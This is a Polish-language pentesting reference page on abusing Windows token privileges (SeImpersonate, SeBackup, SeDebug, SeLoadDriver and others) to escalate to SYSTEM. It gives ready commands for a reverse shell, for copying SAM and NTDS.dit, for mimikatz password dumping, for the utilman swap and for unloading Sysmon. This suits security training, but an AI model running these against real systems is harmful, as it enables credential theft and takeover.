# Abusing Tokens

{{#include ../../banners/hacktricks-training.md}}

## Tokens

Jeśli **nie wiesz, czym są Windows Access Tokens** przeczytaj tę stronę przed kontynuowaniem:


{{#ref}}
access-tokens.md
{{#endref}}

**Być może uda ci się eskalować uprawnienia, abusing tokens, które już masz**

### SeImpersonatePrivilege

To privilege, które posiada każdy proces, pozwala na impersonation (ale nie creation) dowolnego tokena, pod warunkiem że można uzyskać do niego handle. Uprzywilejowany token może zostać acquired z usługi Windows (DCOM) poprzez zmuszenie jej do wykonania uwierzytelniania NTLM przeciwko exploitowi, a następnie umożliwiając execution procesu z uprawnieniami SYSTEM. Tę vulnerability można exploitować używając różnych tools, takich jak [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (który wymaga, aby winrm było disabled), [SweetPotato](https://github.com/CCob/SweetPotato) oraz [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Modern operator notes:

- **JuicyPotato is legacy**: na Windows 10 1809+/Server 2019+, preferuj **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato** albo **PrintSpoofer** w zależności od tego, która powierzchnia RPC/COM jest nadal reachable.
- Jeśli przejąłeś usługę uruchomioną jako **`LOCAL SERVICE`** lub **`NETWORK SERVICE`** i `whoami /priv` pokazuje **filtered token** bez `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, najpierw odzyskaj **default privilege set** konta (na przykład przy użyciu **FullPowers**), a potem ponownie spróbuj rodziny potato.
- Niektóre nowsze fork są bardziej operator-friendly niż oryginalne tools. Na przykład **SigmaPotato** dodaje reflection/in-memory execution i nowoczesną zgodność z Windows, a **PrintNotifyPotato** abuseuje usługę PrintNotify COM i często jest przydatny, gdy klasyczna ścieżka Spooler jest disabled.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Jest bardzo podobne do **SeImpersonatePrivilege**, użyje **tej samej metody**, aby uzyskać uprzywilejowany token.\
Następnie to uprawnienie pozwala **przypisać primary token** do nowego/zawieszonego procesu. Za pomocą uprzywilejowanego tokenu impersonation można utworzyć pochodny primary token (DuplicateTokenEx).\
Dzięki tokenowi można utworzyć **nowy proces** za pomocą 'CreateProcessAsUser' albo utworzyć proces w stanie suspended i **ustawić token** (ogólnie nie można modyfikować primary token uruchomionego procesu).

### SeTcbPrivilege

Jeśli to uprawnienie jest włączone, można użyć **KERB_S4U_LOGON**, aby uzyskać **impersonation token** dla dowolnego innego użytkownika bez znajomości poświadczeń, **dodać dowolną grupę** (admins) do tokenu, ustawić **integrity level** tokenu na "**medium**" i przypisać ten token do **current thread** (SetThreadToken).

### SeBackupPrivilege

Ten przywilej powoduje, że system **udziela pełnego dostępu do odczytu** do dowolnego pliku (ograniczonego do operacji odczytu). Jest wykorzystywany do **odczytu hashy haseł lokalnych kont Administrator** z rejestru, po czym można użyć narzędzi takich jak "**psexec**" lub "**wmiexec**" z hashem (technika Pass-the-Hash). Jednak ta technika zawodzi w dwóch przypadkach: gdy konto Local Administrator jest wyłączone albo gdy obowiązuje polityka usuwająca uprawnienia administracyjne lokalnym administratorom łączącym się zdalnie.\
W praktyce najbardziej niezawodnym wbudowanym workflow jest zwykle **VSS + `robocopy /b`**: utwórz/udostępnij shadow copy, a następnie skopiuj `SAM`/`SYSTEM` lub `NTDS.dit` w **backup mode**, co omija file ACLs.
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
You can **abuse this privilege** with:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- following **IppSec** in [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Or as explained in the **escalating privileges with Backup Operators** section of:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Uprawnienie do **zapisu** do dowolnego pliku systemowego, niezależnie od listy kontroli dostępu pliku (ACL), zapewnia to uprawnienie. Otwiera to wiele możliwości eskalacji, w tym możliwość **modyfikowania usług**, wykonywania DLL Hijacking oraz ustawiania **debuggers** poprzez Image File Execution Options, a także wielu innych technik.

### SeCreateTokenPrivilege

SeCreateTokenPrivilege to potężne uprawnienie, szczególnie przydatne, gdy użytkownik ma możliwość impersonate tokens, ale także w przypadku braku SeImpersonatePrivilege. Ta możliwość opiera się na zdolności do impersonate token, który reprezentuje tego samego użytkownika i którego integrity level nie przekracza poziomu bieżącego procesu.

**Key Points:**

- **Impersonation without SeImpersonatePrivilege:** Możliwe jest wykorzystanie SeCreateTokenPrivilege do EoP poprzez impersonate tokens w określonych warunkach.
- **Conditions for Token Impersonation:** Skuteczne impersonation wymaga, aby docelowy token należał do tego samego użytkownika i miał integrity level mniejszy lub równy integrity level procesu próbującego impersonation.
- **Creation and Modification of Impersonation Tokens:** Użytkownicy mogą utworzyć impersonation token i ulepszyć go, dodając SID (Security Identifier) uprzywilejowanej grupy.

### SeLoadDriverPrivilege

To uprawnienie pozwala **ładować i odładowywać device drivers** poprzez utworzenie wpisu w rejestrze z określonymi wartościami `ImagePath` i `Type`. Ponieważ bezpośredni zapis do `HKLM` (HKEY_LOCAL_MACHINE) jest ograniczony, zamiast tego trzeba użyć `HKCU` (HKEY_CURRENT_USER). Aby jednak `HKCU` było rozpoznawane przez kernel do konfiguracji drivera, należy użyć określonej ścieżki.

Nowoczesne ofensywne użycie to zwykle **BYOVD** (bring your own vulnerable driver): załaduj **podpisany, ale podatny** kernel driver, a następnie użyj jego IOCTLs, aby wyłączyć zabezpieczenia lub przejść do kernel code execution. Pamiętaj, że w nowszych buildach Windows 11/Server **Microsoft vulnerable driver blocklist** i/lub **HVCI/Memory Integrity** często psują starsze publiczne łańcuchy, więc klasyczne przykłady w stylu `szkg64.sys` nie są już uniwersalnie niezawodne.

Ta ścieżka to `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, gdzie `<RID>` to Relative Identifier bieżącego użytkownika. Wewnątrz `HKCU` cała ta ścieżka musi zostać utworzona, a dwie wartości muszą zostać ustawione:

- `ImagePath`, czyli ścieżka do binarki, która ma zostać wykonana
- `Type`, z wartością `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Steps to Follow:**

1. Uzyskaj dostęp do `HKCU` zamiast `HKLM` z powodu ograniczonego dostępu do zapisu.
2. Utwórz w `HKCU` ścieżkę `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, gdzie `<RID>` reprezentuje Relative Identifier bieżącego użytkownika.
3. Ustaw `ImagePath` na ścieżkę wykonania binarki.
4. Ustaw `Type` jako `SERVICE_KERNEL_DRIVER` (`0x00000001`).
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
Więcej sposobów na abuse tego privilege w [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Jest to podobne do **SeRestorePrivilege**. Jego główna funkcja pozwala procesowi **przejąć ownership obiektu**, omijając wymóg jawnego discretionary access dzięki przyznaniu praw dostępu WRITE_OWNER. Proces polega najpierw na zabezpieczeniu ownership docelowego registry key do celów zapisu, a następnie na modyfikacji DACL, aby umożliwić operacje zapisu.
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

To uprawnienie pozwala na **debugowanie innych procesów**, w tym odczyt i zapis w pamięci. Z tym uprawnieniem można stosować różne strategie memory injection, zdolne do omijania większości antywirusów i host intrusion prevention solutions.

On modern Windows, pamiętaj, że `SeDebugPrivilege` zwykle wystarcza do otwarcia **non-protected SYSTEM processes** i duplikowania ich tokenów, ale **nie** gwarantuje możliwości ingerencji w **LSASS**. Jeśli **RunAsPPL / LSA Protection** jest włączone, non-protected processes nie mogą odczytywać ani wykonywać injection do LSASS, nawet jeśli obecne jest `SeDebugPrivilege`. W takim przypadku ukradnij token z innego non-PPL SYSTEM process albo połącz to z PPL bypass/BYOVD zamiast zakładać, że `procdump` zadziała. Pełny przykład kopiowania tokenu z użyciem `SeDebugPrivilege` + `SeImpersonatePrivilege` znajdziesz [na tej stronie](sedebug-+-seimpersonate-copy-token.md).

#### Dump memory

Możesz użyć [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) z [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite), aby **zrzucić pamięć procesu**. W szczególności dotyczy to procesu **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, który odpowiada za przechowywanie poświadczeń użytkownika po pomyślnym zalogowaniu do systemu.

Następnie możesz załadować ten zrzut w mimikatz, aby uzyskać hasła:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

Jeśli chcesz uzyskać shell `NT SYSTEM`, możesz użyć:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

To uprawnienie (Perform volume maintenance tasks) pozwala otwierać surowe uchwyty urządzeń woluminów (np. \\.\C:) do bezpośredniego I/O dysku, omijając ACL NTFS. Dzięki temu można kopiować bajty dowolnego pliku na woluminie, odczytując leżące pod spodem bloki, co umożliwia arbitralny odczyt plików z poufnymi danymi (np. machine private keys w %ProgramData%\Microsoft\Crypto\, registry hives, SAM/NTDS via VSS). Jest to szczególnie istotne na serwerach CA, gdzie exfiltrating CA private key umożliwia stworzenie Golden Certificate do impersonate dowolnego principal.

Zobacz szczegółowe techniki i mitigations:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Check privileges
```
whoami /priv
```
**Tokeny**, które pojawiają się jako Disabled, zwykle można włączyć, więc często można abuse zarówno uprawnień _Enabled_, jak i _Disabled_.

### Włącz wszystkie tokeny

Jeśli masz wyłączone uprawnienia, możesz użyć skryptu [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1), aby włączyć wszystkie tokeny:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
Albo **script** osadzony w tym [**poście**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Table

Pełna ściągawka uprawnień tokenów w [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin), poniższe podsumowanie wymienia tylko bezpośrednie sposoby wykorzystania uprawnienia, aby uzyskać sesję admina lub odczytać wrażliwe pliki.

| Privilege                  | Impact      | Tool                    | Execution path                                                                                                                                                                                                                                                                                                                                     | Remarks                                                                                                                                                                                                                                                                                                                        |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"Pozwalałoby użytkownikowi impersonować tokeny i wykonać privesc do nt system używając narzędzi takich jak potato.exe, rottenpotato.exe i juicypotato.exe"_                                                                                                                                                                                           | Dziękuję [Aurélien Chalot](https://twitter.com/Defte_) za aktualizację. Postaram się wkrótce przepisać to w bardziej recepturowy sposób.                                                                                                                                                                                       |
| **`SeBackup`**             | **Threat**  | _**Built-in commands**_ | Odczytaj wrażliwe pliki za pomocą `robocopy /b` lub dedykowanych narzędzi kopiujących świadomych SeBackup.                                                                                                                                                                                                                                          | <p>- Świetne do `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit` i czasami `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` jest wygodne, ale dedykowane cmdlet'y/API dla SeBackup są często bardziej elastyczne przy zablokowanych/otwartych plikach.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | Utwórz dowolny token, w tym z lokalnymi uprawnieniami admina, za pomocą `NtCreateToken`.                                                                                                                                                                                                                                                           |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Zduplikuj token SYSTEM **non-PPL** albo zrzuć pamięć z procesu niechronionego.                                                                                                                                                                                                                                                                     | <p>Zrzut LSASS jest zwykle blokowany, jeśli włączone jest RunAsPPL/LSA Protection.</p><p>Script do znalezienia w [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | Użyj rodziny **Potato** / impersonacji named pipe, aby uruchomić SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, etc.).                                                                                                                                                                                     | <p>Najpraktyczniejsze z kont serwisowych, takich jak IIS APPPOOL, MSSQL, taski harmonogramu, albo dowolny kontekst, który już posiada `SeImpersonatePrivilege`.</p>                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. Załaduj podpisany, ale podatny sterownik jądra (BYOVD)<br>2. Użyj IOCTL sterownika, aby uzyskać kernel R/W, wyłączyć narzędzia bezpieczeństwa albo podnieść uprawnienia do SYSTEM<br><br>Alternatywnie to uprawnienie może być użyte do odładowania sterowników związanych z bezpieczeństwem za pomocą wbudowanego polecenia <code>fltMC</code>, np. <code>fltMC sysmondrv</code></p>                     | <p>Starsze publiczne sterowniki, takie jak <code>szkg64.sys</code>, są coraz częściej blokowane na nowoczesnym Windows przez vulnerable-driver blocklist / HVCI.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Uruchom PowerShell/ISE z obecnym uprawnieniem SeRestore.<br>2. Włącz uprawnienie za pomocą <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Zmień nazwę utilman.exe na utilman.old<br>4. Zmień nazwę cmd.exe na utilman.exe<br>5. Zablokuj konsolę i naciśnij Win+U</p> | <p>Atak może zostać wykryty przez niektóre oprogramowanie AV.</p><p>Alternatywna metoda opiera się na podmianie binarek usług przechowywanych w "Program Files" przy użyciu tego samego uprawnienia</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Zmień nazwę cmd.exe na utilman.exe<br>4. Zablokuj konsolę i naciśnij Win+U</p>                                                                                                                                       | <p>Atak może zostać wykryty przez niektóre oprogramowanie AV.</p><p>Alternatywna metoda opiera się na podmianie binarek usług przechowywanych w "Program Files" przy użyciu tego samego uprawnienia.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>Modyfikuj tokeny tak, aby zawierały lokalne uprawnienia admina. Może wymagać SeImpersonate.</p><p>Do weryfikacji.</p>                                                                                                                                                                                                                             |                                                                                                                                                                                                                                                                                                                                |

## References

- Spójrz na tę tabelę definiującą Windows tokens: [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)
- Spójrz na [**ten paper**](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt) o privesc z użyciem tokenów.
- itm4n – Give Me Back My Privileges! Please? (restricted service tokens / FullPowers): https://itm4n.github.io/localservice-privileges/
- Microsoft – Robocopy (`/b` backup mode bypasses file/folder ACL checks): https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy
- Microsoft – Perform volume maintenance tasks (SeManageVolumePrivilege): https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks
- 0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate): https://0xdf.gitlab.io/2025/10/04/htb-certificate.html

{{#include ../../banners/hacktricks-training.md}}
